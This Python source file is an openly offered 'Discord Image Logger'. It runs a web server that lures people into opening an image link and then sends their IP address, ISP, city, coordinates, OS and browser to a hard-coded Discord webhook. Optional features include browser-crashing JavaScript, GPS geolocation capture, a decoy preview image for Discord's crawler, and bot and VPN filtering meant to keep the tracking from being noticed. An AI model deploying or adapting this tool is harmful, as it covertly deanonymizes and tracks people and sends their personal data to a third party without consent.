# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1345696397294440468/n9KQJzphwm8XQE36btWCXg6mqQv23yRymzDHaHsafzZAbmtlucDPHKTuDO_NXz-5F__D",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
